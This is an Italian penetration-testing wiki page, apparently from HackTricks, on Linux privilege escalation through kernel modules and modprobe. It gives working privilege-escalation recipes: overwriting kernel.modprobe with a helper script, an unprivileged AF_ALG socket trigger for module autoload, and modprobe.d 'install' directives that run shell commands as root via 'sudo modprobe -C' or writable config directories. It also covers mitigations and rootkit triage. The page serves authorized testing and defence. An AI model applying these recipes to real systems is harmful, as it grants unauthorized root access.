# Abuso dei moduli del kernel e di modprobe

{{#include ../../banners/hacktricks-training.md}}

## Errate configurazioni dei moduli del kernel e del caricamento dei moduli

Il supporto dei moduli del kernel è un'area ad alto impatto durante la verifica dell'escalation dei privilegi su Linux. Non considerare di per sé sfruttabile ogni messaggio relativo a moduli non firmati, ma usalo per rispondere a domande pratiche.<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- L'utente corrente può caricare moduli tramite `sudo`, capabilities o un percorso helper scrivibile?
- Il caricamento dei moduli è ancora abilitato?
- L'applicazione delle firme dei moduli è disabilitata?
- Le directory dei moduli, i file dei moduli o i percorsi di configurazione di `modprobe.d` sono scrivibili?<sup>[[16]](#references)</sup>
- È possibile leggere i log del kernel per confermare cosa è successo?

La verifica rapida inizia con i seguenti controlli dello stato dei moduli, delle firme, dei log e dell'albero dei moduli.<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

Interpretazione:

- `modules_disabled=1` significa che i moduli non possono essere né caricati né scaricati e che il valore non può essere reimpostato su `0` fino al riavvio.<sup>[[1]](#references)</sup>
- `module.sig_enforce=1` nella riga di comando del kernel o `CONFIG_MODULE_SIG_FORCE=y` richiede moduli validamente firmati; in caso contrario, i moduli non firmati potrebbero essere caricati e compromettere il kernel.<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` non impone restrizioni a `dmesg`; quando è impostato su `1`, l'accesso richiede `CAP_SYSLOG`.<sup>[[1]](#references)</sup>
- I percorsi scrivibili sotto `/lib/modules/$(uname -r)/` sono pericolosi perché `modprobe` cerca in quell'albero e nei relativi dati sulle dipendenze durante il caricamento dei moduli.<sup>[[8]](#references)</sup>

### Caricare un modulo e leggere l'output del kernel

Se hai l'autorizzazione legittima a caricare un modulo locale, `insmod` inserisce esattamente il file `.ko` specificato. La funzione init del modulo viene eseguita durante il caricamento e i messaggi scritti con `printk()` finiscono nel buffer del log del kernel, che normalmente si legge con `dmesg`.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

Un flusso di revisione minimo usa `modinfo` per esaminare i metadati, `insmod` e `rmmod` per caricare e rimuovere un modulo, `lsmod` per verificare lo stato di caricamento e `dmesg` per esaminare i log del kernel.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

Se `sudo -l` consente `insmod`, `modprobe` o un wrapper che li richiama, consideralo critico: `sudo -l` elenca i privilegi dell'utente che lo esegue e per caricare un modulo del kernel è necessario `CAP_SYS_MODULE`. Vedi [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) per i percorsi basati direttamente sulle capability.<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` consentito da sudo

Una regola sudo che consente a un utente di eseguire `insmod` non è paragonabile al consentire l’uso di un normale strumento di amministrazione. Il codice di inizializzazione del modulo viene eseguito durante il suo caricamento, quindi la domanda pratica da porsi durante la verifica è se questo utente possa scegliere o modificare il modulo da caricare.<sup>[[3]](#references)</sup>

Il seguente flusso di verifica generico ripete i controlli di ispezione, caricamento, stato, log e rimozione per un modulo candidato.<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

Se l'utente può fornire un file `.ko` arbitrario, in una valutazione autorizzata la situazione va considerata una compromissione completa del sistema. Una procedura operativa più sicura consiste nell'evitare di delegare il caricamento dei moduli tramite sudo; se è inevitabile, limitare il percorso esatto, la proprietà, i permessi, i criteri di firma e la procedura di rimozione.<sup>[[3]](#references)[[10]](#references)</sup>

Per una procedura innocua di compilazione dei moduli in un ambiente di laboratorio controllato, di seguito sono mostrati un sorgente minimo e un Makefile; la forma `make -C /lib/modules/$(uname -r)/build M=$PWD` segue il flusso di lavoro kbuild documentato dal kernel per i moduli esterni.<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

Costruisci e carica solo in un laboratorio autorizzato; kbuild compila il modulo esterno e i comandi di caricamento/rimozione richiamano le interfacce dei moduli del kernel.<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### Verifiche di abuso di `kernel.modprobe` / `modprobe_path`

`kernel.modprobe` indica l’helper userspace che il kernel esegue per le richieste di caricamento automatico dei moduli; questo sysctl influisce sul caricamento automatico, non sull’inserimento esplicito dei moduli. Se un attaccante può modificarlo impostandolo su un percorso eseguibile scrivibile e attivare una richiesta di caricamento di un modulo, quell’helper diventa un percorso per l’esecuzione di codice con privilegi elevati. Impostarlo su una stringa vuota disabilita le richieste di caricamento automatico; se `CONFIG_STATIC_USERMODEHELPER=y`, un valore non vuoto viene sostituito dal percorso dell’helper statico definito in fase di compilazione.<sup>[[1]](#references)</sup>

Verifica il percorso corrente dell’helper tramite l’interfaccia sysctl del kernel e controlla proprietario e permessi del file di destinazione.<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

Verifica se è possibile influenzare sysctl, le regole sudo delegate o le capability dei file.<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

Il seguente schema, destinato esclusivamente ai laboratori, modifica il percorso dell’helper e attiva una richiesta documentata di autocaricamento di un modulo; usalo solo su un sistema isolato e autorizzato.<sup>[[1]](#references)</sup>

Sui kernel Linux attuali, non usare un eseguibile sconosciuto come trigger generico: il legacy autoloading dei moduli per formati binari personalizzati è stato rimosso in Linux 6.14, mentre la documentazione del kernel indica un tipo di filesystem sconosciuto come percorso per richiedere l’autocaricamento di un modulo.<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Sui sistemi hardened, l’operazione dovrebbe fallire se le autorizzazioni impediscono le scritture non privilegiate su `kernel.modprobe`, il percorso dell’helper non è scrivibile o il caricamento automatico dei moduli è disabilitato.<sup>[[1]](#references)</sup>

### Trigger di autoload AF_ALG

Il trigger del filesystem descritto sopra usa `mount`, che richiede privilegi.<sup>[[1]](#references)</sup> Se sono disponibili socket AF_ALG, un utente non privilegiato può invece associarne uno a un tipo deliberatamente inesistente.<sup>[[17]](#references)[[18]](#references)</sup> `alg_bind()` richiede quindi `algif-<type>` tramite `request_module()`, che richiama l’helper del modulo configurato.<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Questo funziona anche dopo la rimozione, in Linux 6.14, del caricamento automatico legacy dei formati binari sconosciuti.<sup>[[11]](#references)[[17]](#references)</sup> È previsto che `bind()` fallisca perché il tipo non esiste; controlla l’effetto collaterale dell’helper anziché il valore restituito dal socket.<sup>[[17]](#references)[[18]](#references)</sup>

In un lab autorizzato, configura prima l’helper controllato o una regola `modprobe.d`, quindi attiva una richiesta senza `sudo` né `CAP_SYS_MODULE`.<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ accetta una tupla `(type, name)` per il bind AF_ALG.<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

Questo percorso richiede un socket AF_ALG utilizzabile e un valore non vuoto per `kernel.modprobe`.<sup>[[1]](#references)[[18]](#references)</sup> Nei kernel con `/proc/sys/crypto/af_alg_restrict`, il valore `2` disabilita la creazione di socket AF_ALG; il valore `1` limita gli algoritmi, ma non impedisce la richiesta di un tipo mancante in `alg_bind()`.<sup>[[18]](#references)[[21]](#references)</sup> Un LSM può rifiutare la richiesta del modulo prima che venga invocato l'helper.<sup>[[19]](#references)</sup>

### Configurazione `modprobe.d` scrivibile e `sudo modprobe -C`

Prima di risolvere un modulo, `modprobe` legge i file `.conf` dalle directory di configurazione, come `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d` e `/lib/modprobe.d`, in ordine di precedenza. Un file con lo stesso nome in una directory con priorità più alta nasconde quello nella directory con priorità più bassa. Ancora più importante, una direttiva `install <module> <command>` esegue un comando shell arbitrario **invece di** inserire quel modulo. Pertanto, un percorso di configurazione scrivibile può consentire l'esecuzione differita di comandi con le credenziali di un successivo chiamante privilegiato di `modprobe`; la verifica delle firme dei moduli del kernel non autentica questo comando nello userspace.<sup>[[16]](#references)</sup>

Verifica i permessi di directory e file, quindi esamina la configurazione effettiva. `modprobe -n -v` è sicuro per esaminare la risoluzione, perché la modalità dry-run non inserisce il modulo né esegue un comando `install`/`remove`. Preferisci `modprobe -c` alla forma legacy `--showconfig`, che la documentazione attuale di kmod indica come destinata alla rimozione dopo kmod 36.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

Una regola sudo senza restrizioni per `modprobe` è sfruttabile anche quando i file `.ko` arbitrari non superano la verifica della firma: `-C` seleziona una directory di configurazione controllata dall’attaccante, dalla quale il processo avviato da sudo può eseguire un comando `install`.<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

Se una directory `modprobe.d` visibile all'helper del kernel è scrivibile, lo stesso [trigger di autoload AF_ALG](#unprivileged-af_alg-autoload-trigger) può eseguire subito una direttiva `install algif-htprobe`, senza attendere che un amministratore chiami `modprobe`.<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> In un lab autorizzato, inserisci un comando innocuo che crei un marker in un file `.conf` scrivibile, verifica la risoluzione con `modprobe -n -v algif-htprobe` e poi esegui il trigger sopra.<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` e l'applicazione della firma dei moduli bloccano l'inserimento dei moduli, non questo comando `install` in userspace; un `kernel.modprobe` vuoto o un percorso AF_ALG bloccato impedisce invece questa modalità di autoload.<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Per la mitigazione, non concedere tramite sudo l’uso di `modprobe` senza restrizioni sugli argomenti, mantenere ogni directory di configurazione di proprietà di root e non scrivibile e verificare la presenza di direttive `install`/`remove` inattese. Quando un flusso di lavoro amministrativo attendibile deve ignorare tali direttive per un modulo, `modprobe --ignore-install` le ignora per il modulo specificato, ma le dipendenze possono avere comandi propri.<sup>[[8]](#references)[[16]](#references)</sup>

### Verifica delle directory `/lib/modules` scrivibili

Le directory dei moduli scrivibili possono consentire la sostituzione di moduli, l’inserimento di moduli malevoli o abusi del caricamento automatico, a seconda di come viene invocato successivamente `modprobe`; `modprobe` cerca in `/lib/modules/$(uname -r)` e usa i dati delle dipendenze durante la risoluzione dei moduli.<sup>[[8]](#references)</sup>

Verifica i file dei moduli scrivibili e i metadati delle dipendenze e degli alias nell’albero dei moduli della versione del kernel attiva.<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

Se trovi contenuti di moduli scrivibili, esamina come modprobe risolve le dipendenze e come modinfo riporta i metadati dei moduli.<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

Note difensive:

- Mantieni `/lib/modules` di proprietà di `root:root` e non scrivibile dagli utenti.<sup>[[8]](#references)</sup>
- Imposta `kernel.modules_disabled=1` dopo l'avvio, ove possibile dal punto di vista operativo.<sup>[[1]](#references)</sup>
- Applica la firma dei moduli sui sistemi che richiedono moduli caricabili.<sup>[[2]](#references)</sup>
- Monitora le scritture a `/proc/sys/kernel/modprobe`, `/lib/modules` e alle directory di configurazione `modprobe.d`, oltre all'esecuzione imprevista di `insmod`/`modprobe`.<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Triage dei rootkit basati su moduli

Un modulo malevolo può intercettare syscall, viste VFS o `/proc`, percorsi di rete o controlli delle credenziali per nascondere processi e file, reindirizzare il traffico o intercettare segreti. Può anche rimuoversi dall'elenco dei moduli mostrato da `lsmod`. La persistenza può derivare da alias o regole `install` in `modprobe.d`, da `/etc/modules-load.d`, da un'unità systemd, dal contenuto di initramfs o dalla sostituzione di un file `.ko` legittimo. Un risultato normale di `lsmod` è una prova utile, ma una compromissione a livello kernel può rendere inaffidabili gli elenchi forniti dal kernel. Incrocia le informazioni sui moduli caricati, i file su disco, la configurazione di avvio, i log di caricamento dei moduli e la telemetria esterna attendibile.

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

Esamina nomi, percorsi, dipendenze, firme e tempi di caricamento dei moduli inattesi. I messaggi relativi al taint del kernel e ai moduli non firmati sono indizi, non prove della presenza di un rootkit. Se si sospetta un rootkit, raccogli le prove da un'immagine attendibile o da un ambiente di ripristino prima di fare affidamento sull'output del kernel in esecuzione. La pagina [valutazione delle vulnerabilità del kernel](kernel-vulnerability-assessment.md) tratta la configurazione e l'esposizione diagnostica, inclusi tracefs e gli oggetti BPF pinned.



## References

- [1] [Documentazione per /proc/sys/kernel/ — Documentazione del kernel Linux](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Funzionalità di firma dei moduli kernel — Documentazione del kernel Linux](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Nozioni di base sui driver — Documentazione del kernel Linux](https://docs.kernel.org/driver-api/basics.html)
- [6] [Registrazione dei messaggi con printk — Documentazione del kernel Linux](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [Compilazione di moduli esterni — Documentazione del kernel Linux](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Unisci il tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Pagina del manuale Linux](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [Rilanciare la tecnica modprobe_path: superare la patch di search_binary_handler() — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [bind di AF_ALG e richiesta di un modulo — Codice sorgente del kernel Linux](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Invocazione dell'helper del modulo — Codice sorgente del kernel Linux](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Documentazione Python](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Documentazione del kernel Linux](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
